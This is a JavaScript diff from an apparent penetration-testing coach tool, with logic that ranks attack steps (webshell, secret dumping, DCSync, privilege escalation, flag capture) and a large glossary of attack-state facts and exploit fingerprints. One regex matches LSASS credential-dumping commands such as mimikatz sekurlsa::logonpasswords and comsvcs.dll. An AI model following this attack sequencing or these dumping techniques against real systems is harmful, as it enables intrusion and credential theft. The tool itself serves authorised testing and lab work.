+      if ((this.id === 'manual-sqli-exploitation' || this.id === 'sqlmap-automation') && (k === 'foothold.webshell' || k === 'credential.candidate') && (have['credential.available'] || have['credential.plaintext'] || (!facts.context && have['db.creds']))) continue;
+      if (this.id === 'dump-secrets') {
+        var isNonDcDump = !isTargetDomainController(facts);
+        var hasLsass = !!(have['loot.lsass'] || (facts && Array.isArray(facts.facts) && facts.facts.some(function (f) {
+          var v = f && f.value;
+          return f && f.state === 'supported' && v && (v.via === 'lsassy' || v.method === 'lsassy' || v.via === 'mimikatz' || v.via === 'pypykatz');
+        })));
+        if (!hasLsass && facts && facts._resolvedContext && facts._resolvedContext.engagement && Array.isArray(facts._resolvedContext.engagement.activities)) {
+          var dsTgt = (facts.context && facts.context.target) || '';
+          hasLsass = facts._resolvedContext.engagement.activities.some(function (a) {
+            return a && (!dsTgt || !a.target || a.target === dsTgt) && /-M\s+(?:lsassy|nanodump|procdump|handlekatz)|sekurlsa::logonpasswords|comsvcs\.dll/i.test(String(a.command || a.dispatch || ''));
+          });
+        }
+        var hasSamOrLsa = !!(have['loot.sam'] || have['loot.lsa']);
+        if (k === 'loot.ntds' && isNonDcDump && hasSamOrLsa && (hasLsass || !facts.context)) continue;
+        if (k === 'credential.candidate' && (have['loot.ntds'] || (hasSamOrLsa && (hasLsass || !facts.context)))) continue;
+      }
+      if (this.id === 'capabilities' && k === 'loot.files' && hasAdmin) continue;
+      if (this.id === 'suid-gtfobins' && k === 'privesc.leads' && hasAdmin) continue;
+      if (k === 'proof.captured' && ((pk.indexOf('objective.root_flag') >= 0 && have['objective.root_flag']) || (pk.indexOf('objective.local_flag') >= 0 && have['objective.local_flag']))) continue;
+      return false;
+    }
+    return true;
+  };
+
+  Action.prototype.obsolete = function (facts, preHave) {
+    // True once a later achievement makes this move pointless - e.g. the coercion→relay lane is moot
+    // after a completed DCSync (loot.ntds). Retired like a settled move: dropped from the ready list and
+    // the blocked list alike, so the coach stops steering you toward a means to an end you already hold.
+    if (this.id === 'windows-enum' && facts) {
+      var obsEng = facts._resolvedContext && facts._resolvedContext.engagement;
+      var isMultiTgt = !!(obsEng && Array.isArray(obsEng.targets) && obsEng.targets.length > 1);
+      if (!isMultiTgt && ((preHave && (preHave['access.admin'] || preHave['access.system'])) || (typeof facts.has === 'function' && (facts.has('access.admin') || facts.has('access.system'))))) {
+        return true;
+      }
+    }
+    if (canUseFastHave(facts, preHave)) {
+      for (var j = 0; j < this.obsoleted_by.length; j++) { if (preHave[this.obsoleted_by[j]]) return true; }
+      return false;
+    }
+    for (var i = 0; i < this.obsoleted_by.length; i++) { if (facts.has(this.obsoleted_by[i])) return true; }
+    return false;
+  };
+
+  var DEPRIORITIZE_PENALTY = 40;
+  var ACTIONABLE_PRIVESC_VULN_RE = /^vuln\.(jdwp|screen_suid|dirtypipe|dirtycow|polkit|baron_samedit|chkrootkit)$/;
+  function hasConcretePrivescVector(facts) {
+    if (!facts || typeof facts.kinds !== 'function') return false;
+    var kinds = facts.kinds();
+    for (var k in kinds) {
+      if ((/^privesc\./.test(k) && k !== 'privesc.leads') || ACTIONABLE_PRIVESC_VULN_RE.test(k)) return true;
+    }
+    return false;
+  }
+  Action.prototype.effectivePriority = function (facts) {
+    // Base priority, minus a penalty once a fact makes this move a side-quest rather than the point - e.g.
+    // post-domain-admin persistence / path-mapping / pivots sink below the objective (flag capture) and the
+    // cross-box loot once you already hold loot.ntds. The move stays AVAILABLE, just no longer up top.
+    var p = this.priority;
+    for (var i = 0; i < this.deprioritize_when.length; i++) { if (facts.has(this.deprioritize_when[i])) { p -= DEPRIORITIZE_PENALTY; break; } }
+    if ((this.id === 'windows-enum' || this.id === 'linux-enum') && hasConcretePrivescVector(facts)) {
+      p -= 25;
+    }
+    return p;
+  };
+
+  // Authored alternatives allow a command to TEST likely privileged material.
+  // They grant no access facts and never authorize commands inside an existing
+  // session. Resolved views already restrict material to the selected identity.
+  function credentialProbeAllowed(action, facts) {
+    var rule = action && action.credential_probe;
+    if (!rule || !facts || !facts.values) return false;
+    if (facts.context && !facts.context.credentialId) return false;
+    var users = rule.users || [], methods = rule.methods || [];
+    return facts.values('credential.available').some(function (v) {
+      if (!v || !(v.password || v.nthash || v.hash)) return false;
+      var user = String(v.user || '').toLowerCase().replace(/^.*[\\/]/, '');
+      return users.indexOf(user) >= 0 || methods.indexOf(v.method || '') >= 0;
+    });
+  }
+
+  var HTTP_SURFACE_PORT_KINDS = ['port:80', 'port:443', 'port:8080', 'port:8443', 'port:8000', 'port:8888'];
+  function hasActionReqKind(action, hasFn, reqKind, facts) {
+    if (hasFn(reqKind)) return true;
+    if (reqKind === 'http.reachable' && action && action.id === 'ftp-webroot-upload-webshell') {
+      for (var p = 0; p < HTTP_SURFACE_PORT_KINDS.length; p++) {
+        if (hasFn(HTTP_SURFACE_PORT_KINDS[p])) return true;
+      }
+    }
+    if (reqKind === 'kerberos.reachable') {
+      if (hasFn('port:88') || hasFn('ad.dc_candidate')) return true;
+    }
+    if (reqKind === 'port:3306' || reqKind === 'service.mysql' || reqKind === 'port:5432' || reqKind === 'service.postgresql') {
+      if (facts) {
+        var fl = (facts._resolvedContext && Array.isArray(facts._resolvedContext.allScopedFacts))
+          ? facts._resolvedContext.allScopedFacts
+          : (Array.isArray(facts.facts) ? facts.facts : null);
+        var lbp = extractLoopbackDbPorts(fl);
+        if (lbp && ((lbp[3306] && (reqKind === 'port:3306' || reqKind === 'service.mysql')) || (lbp[5432] && (reqKind === 'port:5432' || reqKind === 'service.postgresql')))) {
+          return true;
+        }
+      }
+    }
+    return false;
+  }
+
+  var CONTEXT_SENSITIVE_KIND_RE = /^(?:access\.(?:admin|system|root)$|credential\.|(?:smb|ldap|winrm|ssh|rdp|mssql)\.authenticated$|blocker\.)/;
+  function actionNeedsForActionContext(action, facts, fastHave) {
+    if (action.credential_probe) return true;
+    if (action.id === 'win-interactive-shell' || action.id === 'ad-user-enum') return true;
+    var hasWinrmOrRdp = fastHave
+      ? !!(fastHave['winrm.authenticated'] || fastHave['rdp.authenticated'])
+      : (facts.has('winrm.authenticated') || facts.has('rdp.authenticated'));
+    if (action.os && action.os.length && hasWinrmOrRdp) return true;
+    return v2GetActionMeta(action).hasCtxGate;
+  }
+  function actionBlockedByInvariantGate(action, facts, fastHave, preFam) {
+    var meta = v2GetActionMeta(action);
+    var hasWinrmOrRdp = fastHave
+      ? !!(fastHave['winrm.authenticated'] || fastHave['rdp.authenticated'])
+      : (facts.has('winrm.authenticated') || facts.has('rdp.authenticated'));
+    if (action.os && action.os.length && facts._resolvedContext && facts._resolvedContext.locus === 'overview' && !hasWinrmOrRdp) {
+      var osOk = preFam !== undefined ? osCompatibleWithFamily(facts, preFam, action.os, action) : osCompatible(facts, action.os, action);
+      if (!osOk) return true;
+    }
+    var hasFactFn = null, i, reqAllCtx = meta.reqAllCtx;
+    for (i = 0; i < action.requires_all.length; i++) {
+      if (reqAllCtx[i]) continue;
+      var rk = action.requires_all[i];
+      var hasRk = fastHave ? !!fastHave[rk] : facts.has(rk);
+      if (!hasRk) {
+        if (!hasFactFn) hasFactFn = fastHave ? function (k) { return !!fastHave[k]; } : function (k) { return facts.has(k); };
+        if (hasActionReqKind(action, hasFactFn, rk, facts)) continue;
+        return true;
+      }
+    }
+    if (action.requires_any.length && !action.credential_probe) {
+      var anyPossible = false, reqAnyCtx = meta.reqAnyCtx;
+      for (i = 0; i < action.requires_any.length; i++) {
+        if (reqAnyCtx[i]) { anyPossible = true; break; }
+        var yk = action.requires_any[i];
+        if (fastHave ? fastHave[yk] : facts.has(yk)) { anyPossible = true; break; }
+        if (!hasFactFn) hasFactFn = fastHave ? function (k) { return !!fastHave[k]; } : function (k) { return facts.has(k); };
+        if (hasActionReqKind(action, hasFactFn, yk, facts)) { anyPossible = true; break; }
+      }
+      if (!anyPossible) return true;
+    }
+    return false;
+  }
+
+  Action.prototype.eligible = function (facts, preHave, preFam) {
+    var rMemo = getResolvedFactsMemo(facts);
+    var sigBase = 0;
+    if (rMemo) {
+      sigBase = v2GetActionMeta(this).cacheKey;
+      var cachedE = rMemo.elig.get(this);
+      if (cachedE === sigBase + 2) return true;
+      if (cachedE === sigBase + 1) return false;
+    }
+    var res = this._eligibleImpl(facts, rMemo ? rMemo.have : preHave, rMemo ? rMemo.fam : preFam);
+    if (rMemo) rMemo.elig.set(this, sigBase + (res ? 2 : 1));
+    return res;
+  };
+
+  Action.prototype._eligibleImpl = function (facts, preHave, preFam) {
+    var fastHave = canUseFastHave(facts, preHave) ? preHave : null;
+    if (facts && facts.forAction && (!facts.context || facts.context.actionId !== this.id)) {
+      if (facts._resolvedContext) {
+        if (actionBlockedByInvariantGate(this, facts, fastHave, preFam)) return false;
+        if (!(facts._resolvedContext.locus === 'overview' && !actionNeedsForActionContext(this, facts, fastHave))) {
+          var action = this, candidates = facts.forActionContexts ? facts.forActionContexts(this) : [facts.forAction(this)];
+          return candidates.some(function (candidate) { return action.eligible(candidate); });
+        }
+      } else {
+        var action2 = this, candidates2 = facts.forActionContexts ? facts.forActionContexts(this) : [facts.forAction(this)];
+        return candidates2.some(function (candidate) { return action2.eligible(candidate); });
+      }
+    }
+    // True when the target's OS and proven facts satisfy this action's prerequisites.
+    var osOk2 = (fastHave && preFam !== undefined) ? osCompatibleWithFamily(facts, preFam, this.os, this) : osCompatible(facts, this.os, this);
+    if (!osOk2) return false;
+    var hasFactFn = null;
+    for (var i = 0; i < this.requires_all.length; i++) {
+      var rk2 = this.requires_all[i];
+      if (fastHave ? fastHave[rk2] : facts.has(rk2)) continue;
+      if (!hasFactFn) hasFactFn = fastHave ? function (k) { return !!fastHave[k]; } : function (k) { return facts.has(k); };
+      if (hasActionReqKind(this, hasFactFn, rk2, facts)) continue;
+      return false;
+    }
+    if (this.requires_any.length) {
+      var any = false;
+      for (var j = 0; j < this.requires_any.length; j++) {
+        var yk2 = this.requires_any[j];
+        if (fastHave ? fastHave[yk2] : facts.has(yk2)) { any = true; break; }
+        if (!hasFactFn) hasFactFn = fastHave ? function (k) { return !!fastHave[k]; } : function (k) { return facts.has(k); };
+        if (hasActionReqKind(this, hasFactFn, yk2, facts)) { any = true; break; }
+      }
+      if (!any && !credentialProbeAllowed(this, facts)) return false;
+    }
+    if ((this.id === 'win-interactive-shell' || this.id === 'ad-user-enum' || this.id === 'flag-hunt-windows' || this.id === 'flag-hunt-linux' || this.id === 'windows-enum' || this.id === 'linux-enum' || /^local-windows-/.test(this.id || '')) && this.commands && this.commands.length) {
+      var self = this;
+      if (!this.commands.some(function (c) { return commandIsEligible(c, facts, self); })) return false;
+    }
+    return true;
+  };
+
+  Action.prototype.unmet = function (facts, knownIneligible) {
+    if (facts && facts.forAction && (!facts.context || facts.context.actionId !== this.id)) {
+      if (facts._resolvedContext && facts._resolvedContext.locus === 'overview' && !actionNeedsForActionContext(this, facts)) {
+        // Invariant across per-command contexts; evaluate directly against overview facts.
+      } else if (knownIneligible) {
+        if (facts._resolvedContext && facts._resolvedContext.locus === 'overview' && !facts.has('winrm.authenticated') && !facts.has('rdp.authenticated')) {
+          if (!osCompatible(facts, this.os, this)) {
+            var invFamily = hostOsFamily(facts) || 'another OS';
+            return 'blocked because target looks like ' + invFamily;
+          }
+          var invHasFn = null;
+          for (var qi = 0; qi < this.requires_all.length; qi++) {
+            var qk = this.requires_all[qi];
+            if (CONTEXT_SENSITIVE_KIND_RE.test(qk)) break;
+            if (!facts.has(qk)) {
+              if (!invHasFn) invHasFn = function (k) { return facts.has(k); };
+              if (hasActionReqKind(this, invHasFn, qk, facts)) continue;
+              return 'blocked until ' + friendly(qk) + ' exists';
+            }
+          }
+        }
+        return this.unmet(facts.forAction(this));
+      } else {
+        var action = this, candidates = facts.forActionContexts ? facts.forActionContexts(this) : [facts.forAction(this)];
+        var eligible = candidates.filter(function (candidate) { return action.eligible(candidate); })[0];
+        return this.unmet(eligible || candidates[0]);
+      }
+    }
+    // A friendly one-line reason this action is blocked (first unmet prerequisite).
+    if (!osCompatible(facts, this.os, this)) {
+      var family = hostOsFamily(facts) || 'another OS';
+      return 'blocked because target looks like ' + family;
+    }
+    var hasFactFn = function (k) { return facts.has(k); };
+    for (var i = 0; i < this.requires_all.length; i++) {
+      if (!hasActionReqKind(this, hasFactFn, this.requires_all[i], facts)) {
+        return 'blocked until ' + friendly(this.requires_all[i]) + ' exists';
+      }
+    }
+    if (this.requires_any.length) {
+      var anyMet = false;
+      for (var j = 0; j < this.requires_any.length; j++) {
+        if (hasActionReqKind(this, hasFactFn, this.requires_any[j], facts)) { anyMet = true; break; }
+      }
+      if (!anyMet && !credentialProbeAllowed(this, facts)) {
+        var alts = this.requires_any.map(friendly).join(' or ');
+        return 'blocked until ' + alts;
+      }
+    }
+    return 'blocked';
+  };
+
+  // ------------------------------------------------ friendly fact-kind phrasing --
+  var FRIENDLY = {
+    'target.configured': 'a configured target',
+    'host.up': 'a live host',
+    'host.os_family': 'target OS family', 'host.os_hint': 'target OS hint',
+    'host.interface': 'host network interface', 'host.ip_address': 'host IP address',
+    'host.route': 'host route', 'host.arp_neighbor': 'host ARP neighbor',
+    'host.dns_server': 'host DNS server', 'host.listen_socket': 'host listening socket',
+    'host.tools': 'host tool inventory (present LOLBins)', 'host.multihomed': 'multi-homed host',
+    'network.subnet_candidate': 'candidate adjacent subnet', 'pivot.candidate': 'pivot candidate',
+    'ports.open': 'open ports',
+    'scan.nmap.quick': 'a quick nmap open-port scan', 'scan.nmap.version': 'an nmap service/version scan',
+    'scan.nmap.udp': 'an nmap UDP scan', 'scan.nmap.vuln': 'an nmap NSE vulnerability scan',
+    'scan.local.interfaces': 'local interface enumeration', 'scan.local.routes': 'local route table enumeration',
+    'scan.local.neighbors': 'local neighbor cache enumeration', 'scan.local.dns': 'local resolver enumeration',
+    'scan.local.listeners': 'local listening-socket enumeration',
+    'ad.dc_candidate': 'a domain-controller candidate', 'ad.domain_known': 'the domain',
+    'ad.base_dn': 'the LDAP base DN', 'ad.user_list': 'a domain user list',
+    'ad.protected_user': 'a Protected Users member (Kerberos-only auth)',
+    'ad.anonymous_bind': 'anonymous LDAP bind', 'blocker.smb_null_denied': 'null SMB session rejected (credential needed)', 'blocker.samr_null_denied': 'null-session SAMR user enumeration denied', 'ad.graph.collected': 'the AD graph',
+    'ad.attack_paths': 'attack paths', 'ad.control_paths': 'object-control paths',
+    'ad.trusts': 'domain trusts', 'ad.computer_added': 'an added computer account',
+    'ad.acl_lead': 'an abusable ACL (control lead)',
+    'ad.group_list': 'a list of domain groups', 'ad.computer_list': 'a list of domain computers',
+    'ad.zerologon': 'a confirmed Zerologon-vulnerable DC (CVE-2020-1472)',
+    'ad.coerced_auth': 'a coercible authentication (PetitPotam/PrinterBug/DFSCoerce)',
+    'ad.gpo_control': 'write control over a Group Policy Object',
+    'ad.gpo_writable': 'a writable Group Policy Object (gpo-abuse sink)',
+    'ad.gmsa': 'a discovered Group Managed Service Account',
+    'ad.unconstrained': 'a host trusted for unconstrained delegation',
+    'ad.group_joined': 'a group membership we granted ourselves',
+    'ad.sid_history': 'an injected/abusable SID history entry',
+    'hash.asrep': 'an AS-REP hash', 'hash.tgs': 'a Kerberoast hash', 'hash.ntlm': 'NTLM hashes',
+    'hash.krbtgt': 'the krbtgt hash', 'hash.tgt': 'a TGT',
+    'credential.candidate': 'candidate credentials', 'credential.available': 'a usable credential',
+    'credential.validation': 'credential validation evidence',
+    'credential.certificate': 'certificate material',
+    'credential.ntlm_hash': 'an NT hash', 'credential.plaintext': 'a plaintext password',
+    'credential.weak_hash': 'a weak/unsalted password-hashing scheme',
+    'kerberos.tickets': 'Kerberos tickets', 'kerberos.reachable': 'Kerberos is reachable',
+    'ldap.reachable': 'LDAP is reachable', 'ldap.authenticated': 'authenticated LDAP access',
+    'smb.reachable': 'SMB is reachable', 'smb.authenticated': 'authenticated SMB access',
+    'smb.null_session': 'SMB null session', 'smb.guest_session': 'SMB guest session',
+    'smb.shares': 'SMB shares', 'smb.ms17_010': 'an MS17-010/EternalBlue-vulnerable SMB host (CVE-2017-0144)',
+    'winrm.authenticated': 'authenticated WinRM access',
+    'winrm.reachable': 'WinRM is reachable', 'rdp.reachable': 'RDP is reachable',
+    'host.rdp_enabled': 'RDP remote desktop access enabled (port 3389)',
+    'host.winrm_enabled': 'WinRM remote management access enabled (port 5985)',
+    'rdp.authenticated': 'authenticated RDP access', 'ssh.reachable': 'SSH is reachable',
+    'ssh.authenticated': 'authenticated SSH access', 'ssh.banner': 'an SSH banner',
+    'ssh.hostkey': 'SSH host keys', 'ftp.reachable': 'FTP is reachable',
+    'ftp.authenticated': 'authenticated FTP access', 'ftp.banner': 'an FTP banner',
+    'ftp.anonymous_login': 'anonymous FTP login', 'snmp.reachable': 'SNMP is reachable',
+    'snmp.community': 'an SNMP community', 'snmp.info': 'SNMP system info',
+    'dns.reachable': 'DNS is reachable', 'http.response': 'an HTTP response',
+    'http.redirect': 'an HTTP redirect',
+    'access.admin': 'administrative access', 'access.system': 'SYSTEM access',
+    'access.desktop': 'an interactive desktop', 'foothold.windows': 'a Windows foothold',
+    'access.shell': 'an interactive shell', 'foothold.linux': 'a Linux foothold',
+    'loot.ntds': 'NTDS secrets', 'adcs.vulnerable': 'a vulnerable ADCS template',
+    'persistence.domain': 'domain persistence', 'enum.deep': 'deep enumeration',
+    'vuln.candidates': 'vulnerability candidates', 'relay.success': 'a successful relay',
+    'config.review': 'config review', 'lateral.movement': 'lateral movement',
+    'host.kernel': 'host kernel/version', 'host.arch': 'host architecture',
+    'host.firewall': 'host firewall rules (egress/pivot intel)',
+    'hash.type': 'an identified hash type + cracking mode',
+    'hash.mscache': 'a cached domain-logon hash (MSCache2/DCC2)',
+    'defense.control': 'an endpoint defensive control (AMSI/AppLocker/CLM)',
+    'privesc.leads': 'local privilege escalation leads',
+    'privesc.sudo_rights': 'sudo rights lead',
+    'privesc.sudo_binary': 'a sudo-allowed binary with a GTFOBins escalation',
+    'privesc.suid_candidate': 'SUID/SGID candidate', 'privesc.capability': 'dangerous Linux capability',
+    'privesc.cron_writable': 'writable scheduled task or cron lead',
+    'privesc.scheduled_task': 'a privileged scheduled-task privesc lead',
+    'privesc.process_lead': 'process-monitoring privesc lead',
+    'privesc.passwd_writable': 'writable /etc/passwd lead',
+    'privesc.nfs_no_root_squash': 'NFS no_root_squash lead',
+    'privesc.lxd_group': 'LXD group escape lead', 'privesc.docker_group': 'Docker socket/group escape lead',
+    'privesc.windows_privilege': 'dangerous Windows privilege',
+    'privesc.always_install_elevated': 'AlwaysInstallElevated lead',
+    'privesc.unquoted_service_path': 'unquoted service path lead',
+    'privesc.weak_service_permission': 'weak service permission lead',
+    'privesc.stored_credentials': 'stored Windows credential lead',
+    'privesc.patch_gap': 'missing-patch privesc lead',
+    'privesc.kernel_exploit': 'a suggested kernel/local exploit (linPEAS/LES)',
+    'privesc.dll_hijack_candidate': 'DLL search-order hijack lead',
+    'privesc.service_bof_candidate': 'custom-service buffer-overflow lead',
+    'persistence.linux': 'Linux persistence', 'persistence.windows': 'Windows persistence',
+    'http.reachable': 'HTTP is reachable',
+    'web.content_map': 'a map of discovered web content', 'web.vhost': 'a discovered virtual host',
+    'web.title': 'a web page title', 'web.server': 'a web server header',
+    'web.tech': 'web technology fingerprints', 'web.source': 'exposed application source',
+    'web.parameterized': 'a parameterized web endpoint', 'web.authenticated': 'authenticated web access',
+    'web.upload_form': 'a file-upload form', 'web.upload_confirmed': 'a confirmed file upload',
+    'web.lfi_confirmed': 'a confirmed local file inclusion', 'web.sqli_confirmed': 'a confirmed SQL injection',
+    'web.cmdi_confirmed': 'a confirmed command injection', 'web.ssrf_confirmed': 'a confirmed SSRF',
+    'web.users': 'enumerated application users', 'web.nosqli_confirmed': 'a confirmed NoSQL injection',
+    'web.jwt_secret': 'a recovered JWT signing secret', 'web.authz_bypass': 'a web authorization bypass',
+    'foothold.webshell': 'a web shell', 'db.databases': 'database names', 'db.tables': 'database tables',
+    'db.creds': 'database credential material', 'loot.files': 'recovered files',
+    'loot.material': 'harvested credential material', 'loot.metadata': 'recovered file metadata',
+    'loot.embedded': 'embedded/stego content', 'loot.git_secret': 'secret in git history',
+    'loot.deleted_files': 'recoverable deleted files', 'web.actuator': 'exposed Spring Boot actuator',
+    'policy.lockout': 'account-lockout policy', 'credreuse.tried': 'credential-reuse attempt',
+    'cloud.aws_access': 'AWS cloud access', 'exploit.candidate': 'a candidate exploit',
+    'objective.flag': 'a captured flag', 'objective.local_flag': 'a captured local flag',
+    'objective.root_flag': 'a captured root/proof flag', 'objective.swept': 'a completed post-Domain-Admin flag sweep',
+    'objective.flag_located': 'a located flag',
+    'phish.prepared': 'a prepared client-side (library-ms/WebDAV) attack',
+    'host.domain': "the host's AD domain", 'host.fqdn': "the host's fully-qualified name",
+    'host.hostname': "the host's computer name", 'smb.signing': 'SMB signing posture',
+    'http.body': 'an HTTP response body', 'http.headers': 'HTTP response headers',
+    'http.methods': 'enabled HTTP methods', 'http.cors': 'a permissive CORS policy',
+    'http.exposed': 'an exposed HTTP path or file', 'tls.info': 'TLS certificate/protocol info',
+    'dns.email': 'email DNS records (SPF/DMARC/DKIM)', 'dns.takeover': 'a dangling DNS takeover candidate',
+    'dns.zone': 'DNS records / a permitted zone transfer', 'hash.ike_psk': 'an IKE aggressive-mode PSK hash (crackable)',
+    'web.idor_candidate': 'a candidate IDOR', 'web.xss_confirmed': 'a confirmed cross-site scripting',
+    'web.ssti_confirmed': 'a confirmed server-side template injection',
+    'access.command_exec': 'command execution on the target',
+    'credential.netntlm': 'a captured NetNTLM hash',
+    'loot.shadow': 'captured /etc/shadow hashes', 'db.session': 'an interactive database session',
+    'listener.open': 'a live reverse-shell listener', 'tunnel.socks': 'a live SOCKS pivot',
+    'tunnel.route': 'an established pivot route',
+    'wifi.adapter_present': 'a wireless adapter', 'wifi.driver_loaded': 'a loaded Wi-Fi driver',
+    'wifi.adapter_monitor_capable': 'a monitor/injection-capable adapter',
+    'wifi.monitor_mode': 'monitor mode enabled', 'wifi.injection_capable': 'packet-injection capability',
+    'wifi.ap_discovered': 'a discovered access point', 'wifi.client_seen': 'an observed wireless client',
+    'wifi.handshake_captured': 'a captured WPA handshake', 'wifi.pmkid_captured': 'a captured PMKID',
+    'wifi.psk_cracked': 'a cracked Wi-Fi PSK', 'wifi.associated': 'an associated (on-network) wireless link',
+    'wifi.eap_creds': 'captured WPA-Enterprise EAP credentials',
+    'sccm.enumerated': 'SCCM/MECM enumeration outcome (present/absent)',
+    'mssql.reachable': 'MSSQL is reachable', 'mssql.authenticated': 'an authenticated MSSQL session',
+    'access.root': 'root access', 'privesc.script_sink': 'an injectable sink in a sudo-allowed script',
+    'host.notable_program': 'a bespoke local program worth investigating (a run-this-and-read-it lead)',
+    'host.tool_staged': 'a tool or file staged onto the target host (a confirmed transfer landed)',
+    'dns.a_record': 'a forward DNS A record',
+    'host.program_inspected': 'a notable local program OBOL has already inspected',
+    'lead.stalled': 'a promising move that didn\'t land for a technical reason (worth another look)',
+    'ad.domain_control': 'a DACL control right over the domain root',
+    'web.exposed_artifact': 'an exposed credential-bearing artifact (db/git/archive/config) to fetch and read',
+    'web.artifact_looted': 'an exposed artifact OBOL has already fetched and read',
+    'web.param_candidate': 'a discovered request parameter', 'web.params_discovered': 'parameter fuzzing completed for an endpoint',
+    'web.param_probed': 'an injection probe tried against a parameter', 'web.injectable_param': 'a confirmed injectable parameter',
+    'web.param_exploited': 'an injectable parameter handed off for exploitation',
+    // service reachability leads (consumed by the service-to-foothold conversions)
+    'nfs.reachable': 'a reachable NFS export', 'rsync.reachable': 'a reachable rsync module',
+    'telnet.reachable': 'a reachable Telnet login', 'rservices.reachable': 'reachable Berkeley r-services',
+    'tftp.reachable': 'a reachable TFTP service', 'x11.reachable': 'an open X11 display',
+    'cloud.credential': 'a cloud credential', 'privesc.cron': 'a writable or hijackable cron job',
+    'ssh.key_rejected': 'an SSH key the server refuses',
+    // operational blockers (diagnostic walls a pasted error reveals - each surfaces its fix doctor)
+    'blocker.host_down': 'a host-unreachable result from a ping-gated scan',
+    'blocker.name_resolution': 'a name-resolution failure', 'blocker.clock_skew': 'a Kerberos clock-skew error',
+    'blocker.crlf': 'a CRLF / bad-interpreter error', 'blocker.no_tty': 'a no-TTY / no-terminal error',
+    'blocker.amsi': 'an AMSI block', 'blocker.potato': 'a potato / SeImpersonate failure',
+    'blocker.rate_limited': 'a rate-limit / WAF throttle', 'blocker.tls_scheme': 'a TLS / scheme mismatch',
+    'blocker.hash_format': 'a hash-format / cracking-mode error', 'blocker.hashcat_env': 'a hashcat environment error',
+    'blocker.egress_blocked': 'an egress-blocked callback', 'blocker.smb_signing': 'an SMB-signing-required relay target',
+    'blocker.kerberos_spn': 'a Kerberos SPN error', 'blocker.responder_quiet': 'a quiet Responder (no hashes captured)',
+    'blocker.web_wildcard': 'a wildcard / catch-all web response', 'blocker.ntlm_disabled': 'an NTLM-disabled login',
+    'blocker.password_change': 'a password-change-required login', 'blocker.lockout': 'an account lockout',
+    'blocker.account_restricted': 'a restricted account',
+    'blocker.acl_reauth': 'an access-denied on an ACL write (re-authenticate after the grant)',
+    // known-exploit fingerprints (each gates its matching exploit module)
+    'vuln.vsftpd_234': 'the vsftpd 2.3.4 backdoor fingerprint', 'vuln.proftpd_modcopy': 'the ProFTPD mod_copy fingerprint',
+    'vuln.samba_usermap': 'the Samba usermap_script fingerprint', 'vuln.smbghost': 'the SMBGhost fingerprint',
+    'vuln.bluekeep': 'the BlueKeep fingerprint', 'vuln.shellshock': 'the Shellshock fingerprint',
+    'vuln.heartbleed': 'the Heartbleed fingerprint', 'vuln.drupalgeddon2': 'the Drupalgeddon2 fingerprint',
+    'vuln.phpmyadmin_lfi': 'the phpMyAdmin LFI fingerprint', 'vuln.webmin': 'the Webmin RCE fingerprint',
+    'vuln.usermin': 'the Usermin RCE fingerprint', 'vuln.ofbiz': 'the Apache OFBiz fingerprint',
+    'vuln.cacti': 'the Cacti fingerprint', 'vuln.zabbix': 'the Zabbix fingerprint',
+    'vuln.splunk': 'the Splunk RCE fingerprint', 'vuln.text4shell': 'the Text4Shell fingerprint',
+    'vuln.freeswitch': 'the FreeSWITCH fingerprint', 'vuln.jdwp': 'an open JDWP debug port',
+    'vuln.aerospike': 'the Aerospike UDF fingerprint', 'vuln.wifi_mouse': 'the WiFi Mouse Server fingerprint',
+    'vuln.jenkins': 'the Jenkins RCE fingerprint', 'vuln.nosqli': 'a NoSQL-injection fingerprint',
+    'vuln.dirtycow': 'a DirtyCow-vulnerable Linux kernel (< 4.8.3)',
+    'vuln.dirtypipe': 'a DirtyPipe-vulnerable Linux kernel (5.8 - 5.16.10)',
+    'vuln.baron_samedit': 'a Baron Samedit-vulnerable sudo version (CVE-2021-3156)',
+    'vuln.polkit': 'a PwnKit-vulnerable pkexec version (CVE-2021-4034)',
+    'ad.nopac': 'a noPac-vulnerable DC (CVE-2021-42278/42287)',
+    'vuln.printnightmare': 'a PrintNightmare-vulnerable Spooler (CVE-2021-34527)',
+    'ad.maq_allow': 'a non-zero MachineAccountQuota (>= 1)',
+    'mssql.sysadmin': 'MSSQL sysadmin privilege or impersonation path',
+    'hash.sntp': 'an MS-SNTP Timeroast machine hash',
+    'loot.keepass_dump': 'a discovered KeePass database (.kdbx) or master key dump',
+    'smb.readable_share': 'a readable SMB share',
+    'smb.content_accessible': 'accessible SMB share contents',
+    'smb.writable_share': 'a writable SMB share',
+    'share.users_readable': 'a readable Users share',
+    'credential.validated': 'a validated credential',
+    'ad.delegation': 'a Kerberos delegation configuration',
+    'ad.rbcd': 'resource-based constrained delegation (RBCD)',
+    'ad.laps': 'a LAPS local administrator password',
+    'ad.laps_lead': 'a LAPS deployment lead',
+    'hash.candidate': 'a candidate password hash',
+    'vuln.h2_console': 'an exposed H2 Database web console',
+    'vuln.oracle_tns': 'an Oracle TNS listener vulnerability',
+    'vuln.aerospike_udf': 'the Aerospike Lua UDF RCE fingerprint',
+    'vuln.chkrootkit': 'a vulnerable chkrootkit cron job (< 0.50)',
+    'vuln.screen_suid': 'a SUID GNU Screen 4.5.0 binary',
+    'vuln.nvms1000': 'the NVMS-1000 directory traversal fingerprint',
+    'vuln.rejetto_hfs': 'the Rejetto HFS RCE fingerprint',
+    'vuln.coldfusion': 'an Adobe ColdFusion LFI/RCE fingerprint',
+    'vuln.gitea': 'a Gitea RCE or exposed repository fingerprint',
+    'vuln.myfaces_jsf': 'an Apache MyFaces JSF ViewState deserialization lead',
+    'vuln.node_serialize': 'a Node.js node-serialize RCE cookie',
+    'vuln.usermin_rce': 'the Usermin RCE fingerprint',
+    'vuln.zabbix_agent': 'an exec-enabled Zabbix agent',
+    'vuln.prtg': 'a PRTG Network Monitor RCE lead',
+    'privesc.cron_wildcard': 'a root cron job using an unquoted wildcard (*)',
+    'privesc.group_lxd': 'LXD/LXC group membership',
+    'privesc.container_group': 'privileged container group membership (docker/lxd)',
+    'privesc.sudo': 'an abusable sudo privilege',
+    'pivot.active': 'an active network pivot tunnel',
+    'tunnel.dns': 'an active DNS covert tunnel',
+    'ftp.anon_write': 'anonymous writable FTP access',
+    'file.nsclient_ini': 'an exposed NSClient++ nsclient.ini config',
+    'web.fingerprint.jenkins': 'a detected Jenkins server',
+    'web.fingerprint.nvms': 'a detected TVT NVMS-1000 web server',
+    'web.forms_discovered': 'discovered HTML forms and parameters',
+    'web.http_request_captured': 'a captured raw HTTP request',
+    'blocker.certutil_usage': 'a certutil download syntax or AV block',
+    'advice.kerberos': 'Kerberos troubleshooting guidance',
+    'advice.relay': 'NTLM relay target guidance',
+    'advice.responder': 'Responder tuning guidance',
